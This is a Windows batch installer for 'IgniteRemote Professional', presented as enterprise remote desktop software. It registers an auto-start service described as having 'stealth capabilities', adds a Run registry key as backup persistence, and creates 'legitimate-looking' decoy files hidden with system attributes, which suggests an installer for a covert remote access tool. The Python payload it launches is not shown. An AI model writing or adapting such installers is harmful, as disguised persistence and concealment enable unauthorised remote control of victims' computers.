@echo off
REM IgniteRemote Professional Installation
REM Enterprise Remote Desktop Solution

echo Installing IgniteRemote Professional Service...
echo.

REM Check if running as administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Administrator privileges confirmed.
) else (
    echo This installation requires administrator privileges.
    echo Please run as administrator.
    pause
    exit /b 1
)

REM Create service directory
if not exist "%ProgramFiles%\IgniteRemote" (
    mkdir "%ProgramFiles%\IgniteRemote"
)

REM Copy files to service directory
echo Copying service files...
copy /Y "*.py" "%ProgramFiles%\IgniteRemote\" >nul
copy /Y "requirements.txt" "%ProgramFiles%\IgniteRemote\" >nul

REM Install Python packages
echo Installing required components...
pip install -r requirements.txt >nul 2>&1

REM Create and install Windows service
echo Registering IgniteRemote service...
sc create "IgniteRemoteProfessional" ^
   binPath= "python \"%ProgramFiles%\IgniteRemote\service_runner.py\"" ^
   start= auto ^
   DisplayName= "IgniteRemote Professional Service" ^
   description= "Enterprise-grade remote desktop solution with advanced security and stealth capabilities."

REM Set service to auto-start
sc config "IgniteRemoteProfessional" start= auto

REM Start the service
echo Starting service...
sc start "IgniteRemoteProfessional"

REM Add to startup (backup method)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
    /v "IgniteRemoteProfessional" ^
    /t REG_SZ ^
    /d "python \"%ProgramFiles%\IgniteRemote\service_runner.py\"" ^
    /f >nul

REM Create legitimate-looking files
echo IgniteRemote Professional v2.0 > "%TEMP%\ignitecache.tmp"
echo Enterprise Remote Desktop Solution >> "%TEMP%\ignitecache.tmp"
attrib +H +S "%TEMP%\ignitecache.tmp"

echo.
echo Installation completed successfully.
echo IgniteRemote Professional is now running as a system service.
echo.
echo Service will start automatically on system boot.
echo To manage the service, use Windows Services (services.msc)
echo.
pause
